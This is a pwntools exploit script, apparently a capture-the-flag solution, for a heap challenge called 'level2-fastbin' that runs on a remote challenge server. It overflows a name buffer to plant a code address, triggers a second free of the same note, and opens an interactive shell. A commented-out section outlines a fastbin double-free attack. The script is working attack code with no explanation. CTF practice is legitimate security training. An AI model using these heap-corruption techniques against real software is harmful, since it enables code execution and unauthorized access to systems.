from pwn import *
context.log_level="debug"
pwn_file="./level2-fastbin"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",22502)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()

hack_pos = 0x400826

def editname(name=""):
    r.recvuntil(">> ")
    r.sendline("4")
    r.recvuntil("Your name:")
    r.sendline(name)

def addnote(content = ''):
    r.recvuntil(">> ")
    r.sendline("1")
    r.recvuntil("Content: ")
    if content:
      r.sendline(content)
    else:
      r.sendline('abc')
    nid =  r.recvline("Note id:")
    return nid[-2:-1]

def deletenote(nid):
    r.recvuntil(">> ")
    r.sendline("3")
    r.recvuntil("Input your id:")
    r.sendline(nid)

r.recvuntil('Your name:')
r.sendline("www")

a= addnote()
deletenote(a)
editname("a"*48 + p64(0x4008B6)[:6])
deletenote(a)


'''this is double free
a = addnote()
b = addnote()
deletenote(a)
deletenote(b)
deletenote(a)
debug()
first_address = p64(0x602500)

c =  addnote(first_address)
d  = addnote()
e  = addnote()
f  = addnote()

'''
r.interactive()
